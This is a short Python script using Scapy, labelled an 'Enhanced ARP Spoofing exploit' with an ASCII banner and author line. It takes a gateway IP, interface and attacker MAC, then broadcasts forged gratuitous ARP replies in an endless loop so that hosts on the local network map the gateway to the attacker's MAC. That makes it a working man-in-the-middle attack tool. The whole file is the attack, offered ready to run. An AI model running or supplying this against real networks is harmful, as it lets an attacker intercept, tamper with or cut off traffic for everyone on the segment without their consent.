#!/usr/bin/env python3

print (r"""
 ▄▄▄▄   ▓█████▄▄▄█████▓ ██▀███   ▄▄▄     ▓██   ██▓ ▄▄▄       ██▓    
▓█████▄ ▓█   ▀▓  ██▒ ▓▒▓██ ▒ ██▒▒████▄    ▒██  ██▒▒████▄    ▓██▒    
▒██▒ ▄██▒███  ▒ ▓██░ ▒░▓██ ░▄█ ▒▒██  ▀█▄   ▒██ ██░▒██  ▀█▄  ▒██░    
▒██░█▀  ▒▓█  ▄░ ▓██▓ ░ ▒██▀▀█▄  ░██▄▄▄▄██  ░ ▐██▓░░██▄▄▄▄██ ▒██░    
░▓█  ▀█▓░▒████▒ ▒██▒ ░ ░██▓ ▒██▒ ▓█   ▓██▒ ░ ██▒▓░ ▓█   ▓██▒░██████▒
░▒▓███▀▒░░ ▒░ ░ ▒ ░░   ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░  ██▒▒▒  ▒▒   ▓▒█░░ ▒░▓  ░
▒░▒   ░  ░ ░  ░   ░      ░▒ ░ ▒░  ▒   ▒▒ ░▓██ ░▒░   ▒   ▒▒ ░░ ░ ▒  ░
 ░    ░    ░    ░        ░░   ░   ░   ▒   ▒ ▒ ░░    ░   ▒     ░ ░   
 ░         ░  ░           ░           ░  ░░ ░           ░  ░    ░  ░
      ░                                   ░ ░                                                                                                             
    """)

print ("Enhanced ARP Spoofing exploit")
print("Author: Magama Bazarov, @in9uz, <in9uz@protonmail.com>\n")

from scapy.all import *
from scapy.layers.l2 import *
import argparse


l2broad = "FF:FF:FF:FF:FF:FF"

def take_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("--gateway", dest="gateway", type=str, required=True, help="Choose gateway IP address")
    parser.add_argument("--interface", dest="interface", type=str, required=True, help="Choose your interface for attack")
    parser.add_argument("--mac", dest="evilmac", type=str, required=True, help="Specify your MAC Address")
    args = parser.parse_args()

    return args


args = take_args()


def exploit(gateway, interface, evilmac):
    ether_frame = Ether(src=args.evilmac, dst=l2broad)
    arp_frame = ARP(op="is-at", pdst=args.gateway, hwsrc=args.evilmac, hwdst=l2broad, psrc=args.gateway)
    grat_frame = ether_frame / arp_frame
    grat_frame.show()
    sendp(grat_frame, iface=args.interface, inter=0.3, loop=1, verbose=1)


    
    
exploit(args.interface, args.evilmac, args.gateway)

    




